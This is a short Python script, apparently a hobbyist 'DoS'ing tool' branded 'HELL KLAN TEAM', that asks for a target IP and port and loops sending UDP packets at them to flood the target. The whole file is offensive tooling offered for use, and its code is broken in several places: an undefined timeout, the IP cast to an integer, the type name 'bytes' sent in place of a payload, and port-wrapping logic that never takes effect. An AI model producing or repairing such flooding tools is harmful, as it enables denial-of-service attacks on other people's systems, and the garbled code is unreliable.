import os
import socket
import time
os.system("figlet DARK-IP DoS")
time.sleep(1)
print("DARK-Ip DoS'ing Tool by HELL KLAN TEAM")
print()
IP = int(input("Target IP: "))
Port = input("Target Port: ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    if time.time() > timeout:
        break
    else:
        pass
        sock.sendto(bytes, (IP, Port))
        print("Attack Send! To Stop: Press Ctrl + C")
    if Port == 65500:
        Port = 1